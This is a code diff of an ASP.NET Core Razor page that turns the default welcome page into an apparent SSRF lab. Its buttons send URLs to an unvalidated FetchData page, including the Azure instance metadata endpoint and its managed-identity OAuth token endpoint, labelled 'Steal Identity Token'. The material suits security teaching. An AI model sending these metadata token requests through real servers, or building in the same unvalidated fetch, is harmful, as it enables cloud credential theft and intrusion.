@@ -5,6 +5,45 @@
 }
 
 <div class="text-center">
-    <h1 class="display-4">Welcome</h1>
-    <p>Learn about <a href="https://learn.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+    <h1 class="display-4">Azure Internal Resource Portal</h1>
+    <p>Select a diagnostic tool to begin testing internal connectivity.</p>
+</div>
+
+<div class="container mt-5">
+    <div class="row">
+        <div class="col-md-4">
+            <div class="card shadow-sm">
+                <div class="card-body">
+                    <h5 class="card-title text-success">Level 1: External Check</h5>
+                    <p class="card-text">Verify outbound internet connectivity by fetching Google's homepage.</p>
+                    <a asp-page="/FetchData" asp-route-url="https://www.google.com" class="btn btn-outline-success">Test Internet</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-md-4">
+            <div class="card shadow-sm border-warning">
+                <div class="card-body">
+                    <h5 class="card-title text-warning">Level 2: Instance Info</h5>
+                    <p class="card-text">Attempt to reach the Azure IMDS to see VM hardware and network specs.</p>
+                    <a asp-page="/FetchData" asp-route-url="http://169.254.169.254/metadata/instance?api-version=2021-02-01" class="btn btn-warning">Probe IMDS</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-md-4">
+            <div class="card shadow-sm border-danger">
+                <div class="card-body">
+                    <h5 class="card-title text-danger">Level 3: Token Theft</h5>
+                    <p class="card-text">Exploit the Managed Identity to extract an OAuth Access Token for S3/Storage.</p>
+                    <a asp-page="/FetchData" asp-route-url="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" class="btn btn-danger">Steal Identity Token</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="mt-5 p-4 bg-light border rounded">
+    <h4><i class="bi bi-info-circle"></i> Why this works:</h4>
+    <p>The <code>asp-route-url</code> helper appends a <code>?url=...</code> query string to the request. Because the <code>FetchData</code> backend doesn't validate this input, the server blindly trusts the link you click.</p>
 </div>
